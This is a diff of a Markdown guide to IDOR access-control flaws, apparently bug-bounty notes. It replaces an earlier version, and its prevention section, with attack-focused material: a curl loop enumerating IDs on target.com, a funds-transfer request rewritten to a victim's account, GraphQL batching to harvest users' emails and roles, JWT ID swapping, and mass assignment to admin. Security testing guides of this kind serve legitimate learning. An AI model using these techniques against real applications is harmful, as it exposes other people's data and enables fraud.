@@ -1,123 +1,73 @@
-# Insecure Direct Object References (IDOR)
+# IDOR: Insecure Direct Object Reference
 
-IDOR (Insecure Direct Object Reference) occurs when an application exposes a reference to an internal implementation object — such as a file, database key, or record — without proper access control checks. This is the most common bug bounty finding.
+## Detection at Scale
 
-## How IDOR Works
+### Automated IDOR Testing with Autorize/AuthMatrix
+1. Configure Autorize with two sessions (low-priv + high-priv)
+2. Browse the application with low-priv account
+3. Autorize replays all requests with high-priv cookies
+4. Any 200 response on a request that should require higher privileges = IDOR
 
-```http
-GET /api/v1/users/1234/profile HTTP/1.1
-Authorization: Bearer user_token
-```
-
-If user 1234 can access user 5678's profile by simply changing the ID, that's an IDOR.
-
-## Common IDOR Patterns
-
-### Numeric ID
-```http
-GET /invoice/1001  →  GET /invoice/1002
-POST /api/order/delete
-{"order_id": 5001}  →  {"order_id": 5002}
-```
-
-### UUID/GUID (Predictable)
-```http
-GET /api/document/a1b2c3d4-e5f6-7890-abcd-ef1234567890
-```
-If UUIDs are sequential or created at predictable times, they can be brute-forced.
-
-### Hash-based IDs
-```http
-GET /profile/MTIzNA==    (base64 of "1234")
-GET /profile/MTIzNQ==    (base64 of "1235")
-```
-
-### Email/Username as ID
-```http
-GET /api/user?email=admin@target.com
-GET /api/user?email=other@target.com
-```
-
-## Types of IDOR
-
-| Type | Description |
-|------|-------------|
-| **Horizontal** | Access another user's data at same privilege level |
-| **Vertical** | Access data requiring higher privileges |
-| **Object-level** | Access specific objects (documents, orders, messages) |
-| **Function-level** | Access restricted functions |
-
-## Detection Methodology
-
-### Automated Discovery
+### Parameter Fuzzing
 ```bash
-# Find potential IDOR parameters
-cat urls.txt | grep -E "(id=|user=|account=|profile=|order=|invoice=|document=|file=|download=)" | sort -u
-
-# Use ffuf to enumerate IDs
-ffuf -u "https://target.com/api/users/FUZZ/profile" -w ids.txt -fw 123
-
-# Use Burp Intruder with pitchfork attack
+# Test ID parameters for numeric enumeration
+for id in {1..100}; do
+  status=$(curl -s -o /dev/null -w "%{http_code}" -b "session=lowpriv"     "https://target.com/api/resource?id=$id")
+  if [ "$status" -ne 403 ] && [ "$status" -ne 404 ]; then echo "Potential IDOR: $id -> $status"; fi
+done
 ```
 
-### Manual Testing
-1. **Create two accounts** (or use collaboration)
-2. **Authenticate as User A**, access resource
-3. **Note the resource identifier** in URL or API endpoint
-4. **Replace identifier** with User B's resource identifier
-5. **Check if User A can access User B's data**
+## IDOR Subtypes
 
-## Advanced IDOR Examples
-
-### Multi-step IDOR
+### Sequential ID Enumeration
+Predictable identifiers (auto-increment integers, timestamp-based, MD5 of email):
 ```http
-# Step 1: Create order
-POST /api/orders
-{"product_id": 123, "user_id": 100}
-
-# Step 2: Change user_id to different user
-POST /api/orders
-{"product_id": 123, "user_id": 200}
+GET /api/user/12345 HTTP/1.1
+Host: target.com
+Cookie: session=valid
 ```
 
-### UUID Enumeration
+### UUID/Hash-Based IDOR
+Non-sequential does not mean authorization:
 ```http
-# Predictable UUID generation
-GET /api/users/register    # Server sends welcome email with UUID
-UUID = hash(timestamp + email)
-
-# SSRF to internal IDOR
-GET /internal/api/users?id=123
+GET /api/document/a1b2c3d4-e5f6-7890-abcd-ef1234567890 HTTP/1.1
 ```
 
-### Parameter Pollution
+If the app returns the document when you have the correct UUID but does not verify ownership: you still have IDOR. The question is how to find the UUID. Via: JS file leaks, second-order SQLi, error messages, cache/Grafana logs.
+
+### JWT-Based ID Bypass
+```json
+// JWT payload
+{"user": "attacker", "document_id": "victim_doc"}
+// Change document_id in JWT to another user's document
+```
+
+## Blind IDOR
+
+The app returns "success" regardless but the operation affected another user's resource:
 ```http
-# Both parameters might be evaluated
-GET /api/users?id=100&user_id=200
-
-# JSON array injection
-POST /api/users/delete
-{"user_ids": [100, 200]}
+POST /api/transfer
+{"from_account": "attacker", "to_account": "attacker_other", "amount": 100}
+# Try changing from_account to victim ID
+{"from_account": "victim", "to_account": "attacker_other", "amount": 100}
+# No error but victim lost 100 units = blind IDOR
 ```
 
-## Tools
+## GraphQL IDOR
 
-| Tool | Purpose |
-|------|---------|
-| **Autorize** (Burp) | Detect ATO/IDOR automatically |
-| **AuthMatrix** (Burp) | Role-based access testing |
-| **Burp Intruder** | ID enumeration |
-| **ffuf** | Fuzz IDs across users |
-| **Custom Python** | Sequential ID guessing with auth tokens |
+```graphql
+# Batching bypasses per-request rate limits
+query {
+  u1: user(id: 1) { email role }
+  u2: user(id: 2) { email role }
+  u3: user(id: 3) { email role }
+}
+```
 
-## Prevention
+## IDOR Prevention Bypass
 
-1. **Object-level access controls** — Verify user owns the resource
-2. **Use unpredictable identifiers** — UUIDv4 (non-sequential)
-3. **Don't expose internal IDs** — Use indirect references
-4. **Server-side enforcement** — Never rely on client-side access control
-5. **Comprehensive API testing** — Every endpoint needs access control checks
-
----
-
-> **Next**: [Authentication Bypass](07-authentication-bypass.md)
+If the app uses GUIDs instead of integers, test:
+1. GUIDs leaked in client-side JS (e.g., for document comments, user lists)
+2. Mass assignment: `PUT /api/profile {"role": "admin"}`
+3. Parameter pollution: `GET /api/resource?id=123&id=456` — some frameworks process the second
+4. JSON array injection: `GET /api/resource?ids=[1,2,3,4,5]`
